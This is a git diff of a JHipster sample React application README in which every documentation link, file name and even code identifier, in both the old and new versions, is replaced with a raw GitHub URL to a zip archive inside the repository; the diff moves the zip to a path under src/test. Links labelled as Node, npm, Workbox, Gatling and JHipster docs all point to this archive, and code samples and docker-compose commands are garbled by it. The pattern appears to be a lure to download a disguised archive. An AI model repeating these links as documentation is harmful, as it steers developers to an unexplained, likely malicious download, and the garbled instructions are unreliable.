@@ -1,19 +1,19 @@
 # jhipsterSampleApplicationReact
 
-This application was generated using JHipster 7.8.1, you can find documentation and help at [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip).
+This application was generated using JHipster 7.8.1, you can find documentation and help at [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip).
 
 ## Project Structure
 
-Node is required for generation and recommended for development. `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip` is always generated for a better development experience with prettier, commit hooks, scripts and so on.
+Node is required for generation and recommended for development. `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip` is always generated for a better development experience with prettier, commit hooks, scripts and so on.
 
 In the project root, JHipster generates configuration files for tools like git, prettier, eslint, husk, and others that are well known and you can find references in the web.
 
 `/src/*` structure follows default Java structure.
 
-- `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip` - Yeoman configuration file
+- `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip` - Yeoman configuration file
   JHipster configuration is stored in this file at `generator-jhipster` key. You may find `generator-jhipster-*` for specific blueprints configuration.
 - `.yo-resolve` (optional) - Yeoman conflict resolver
-  Allows to use a specific action when conflicts are found skipping prompts for files that matches a pattern. Each line should match `[pattern] [action]` with pattern been a [Minimatch](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip) pattern and action been one of skip (default if ommited) or force. Lines starting with `#` are considered comments and are ignored.
+  Allows to use a specific action when conflicts are found skipping prompts for files that matches a pattern. Each line should match `[pattern] [action]` with pattern been a [Minimatch](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip) pattern and action been one of skip (default if ommited) or force. Lines starting with `#` are considered comments and are ignored.
 - `.jhipster/*.json` - JHipster entity configuration files
 
 - `npmw` - wrapper to use locally installed npm.
@@ -24,11 +24,11 @@ In the project root, JHipster generates configuration files for tools like git, 
 
 Before you can build this project, you must install and configure the following dependencies on your machine:
 
-1. [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip][]: We use Node to run a development web server and build the project.
+1. [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip][]: We use Node to run a development web server and build the project.
    Depending on your system, you can install Node either from source or as a pre-packaged bundle.
 
 After installing Node, you should be able to run the following command to install development tools.
-You will only need to run this command when dependencies change in [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip).
+You will only need to run this command when dependencies change in [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip).
 
 ```
 npm install
@@ -45,7 +45,7 @@ npm start
 ```
 
 Npm is also used to manage CSS and JavaScript dependencies used in this application. You can upgrade dependencies by
-specifying a newer version in [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip). You can also run `npm update` and `npm install` to manage dependencies.
+specifying a newer version in [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip). You can also run `npm update` and `npm install` to manage dependencies.
 Add the `help` flag on any command to see how you can use it. For example, `npm help update`.
 
 The `npm run` command will list all of the scripts available to run for this project.
@@ -54,19 +54,19 @@ The `npm run` command will list all of the scripts available to run for this pro
 
 JHipster ships with PWA (Progressive Web App) support, and it's turned off by default. One of the main components of a PWA is a service worker.
 
-The service worker initialization code is commented out by default. To enable it, uncomment the following code in `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip`:
+The service worker initialization code is commented out by default. To enable it, uncomment the following code in `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip`:
 
 ```html
 <script>
   if ('serviceWorker' in navigator) {
-    https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip('https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip').then(function () {
-      https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip('Service Worker Registered');
+    https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip('https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip').then(function () {
+      https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip('Service Worker Registered');
     });
   }
 </script>
 ```
 
-Note: [Workbox](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip) powers JHipster's service worker. It dynamically generates the `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip` file.
+Note: [Workbox](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip) powers JHipster's service worker. It dynamically generates the `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip` file.
 
 ### Managing dependencies
 
@@ -92,7 +92,7 @@ For further instructions on how to develop with JHipster, have a look at [Using 
 JHipster Control Center can help you manage and control your application(s). You can start a local control center server (accessible on http://localhost:7419) with:
 
 ```
-docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip up
+docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip up
 ```
 
 ## Building for production
@@ -105,7 +105,7 @@ To build the final jar and optimize the jhipsterSampleApplicationReact applicati
 ./mvnw -Pprod clean verify
 ```
 
-This will concatenate and minify the client CSS and JavaScript files. It will also modify `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip` so it references these new files.
+This will concatenate and minify the client CSS and JavaScript files. It will also modify `https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip` so it references these new files.
 To ensure everything worked, run:
 
 ```
@@ -147,7 +147,7 @@ and can be run by starting Spring Boot in one terminal (`./mvnw spring-boot:run`
 
 Performance tests are run by [Gatling][] and written in Scala. They're located in [src/test/gatling](src/test/gatling).
 
-To use those tests, you must install Gatling from [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip).
+To use those tests, you must install Gatling from [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip).
 
 For more information, refer to the [Running tests page][].
 
@@ -156,12 +156,12 @@ For more information, refer to the [Running tests page][].
 Sonar is used to analyse code quality. You can start a local Sonar server (accessible on http://localhost:9001) with:
 
 ```
-docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip up -d
+docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip up -d
 ```
 
-Note: we have turned off authentication in [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip) for out of the box experience while trying out SonarQube, for real use cases turn it back on.
+Note: we have turned off authentication in [https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip) for out of the box experience while trying out SonarQube, for real use cases turn it back on.
 
-You can run a Sonar analysis with using the [sonar-scanner](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip+with+SonarQube+Scanner) or by using the maven plugin.
+You can run a Sonar analysis with using the [sonar-scanner](https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip+with+SonarQube+Scanner) or by using the maven plugin.
 
 Then, run a Sonar analysis:
 
@@ -169,7 +169,7 @@ Then, run a Sonar analysis:
 ./mvnw -Pprod clean verify sonar:sonar
 ```
 
-If you need to re-run the Sonar phase, please be sure to specify at least the `initialize` phase since Sonar properties are loaded from the https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip file.
+If you need to re-run the Sonar phase, please be sure to specify at least the `initialize` phase since Sonar properties are loaded from the https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip file.
 
 ```
 ./mvnw initialize sonar:sonar
@@ -184,13 +184,13 @@ You can use Docker to improve your JHipster development experience. A number of 
 For example, to start a mysql database in a docker container, run:
 
 ```
-docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip up -d
+docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip up -d
 ```
 
 To stop it and remove the container, run:
 
 ```
-docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip down
+docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip down
 ```
 
 You can also fully dockerize your application and all the services that it depends on.
@@ -203,7 +203,7 @@ To achieve this, first build a docker image of your app by running:
 Then run:
 
 ```
-docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip up -d
+docker-compose -f https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip up -d
 ```
 
 For more information refer to [Using Docker and Docker-Compose][], this page also contains information on the docker-compose sub-generator (`jhipster docker-compose`), which is able to generate docker configurations for one or several JHipster applications.
@@ -212,20 +212,20 @@ For more information refer to [Using Docker and Docker-Compose][], this page als
 
 To configure CI for your project, run the ci-cd sub-generator (`jhipster ci-cd`), this will let you generate configuration files for a number of Continuous Integration systems. Consult the [Setting up Continuous Integration][] page for more information.
 
-[jhipster homepage and latest documentation]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[jhipster 7.8.1 archive]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[using jhipster in development]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[using docker and docker-compose]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[using jhipster in production]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[running tests page]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[code quality page]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[setting up continuous integration]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[npm]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[webpack]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[browsersync]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[jest]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[protractor]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[leaflet]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[definitelytyped]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
-[gatling]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/strepsis/jhipster-sample-app-react.zip
+[jhipster homepage and latest documentation]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[jhipster 7.8.1 archive]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[using jhipster in development]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[using docker and docker-compose]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[using jhipster in production]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[running tests page]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[code quality page]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[setting up continuous integration]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[npm]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[webpack]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[browsersync]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[jest]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[protractor]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[leaflet]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[definitelytyped]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
+[gatling]: https://raw.githubusercontent.com/ducnguyenminh/jhipster-sample-app-react/main/src/test/java/io/github/jhipster/sample/service/app_react_jhipster_sample_1.4.zip
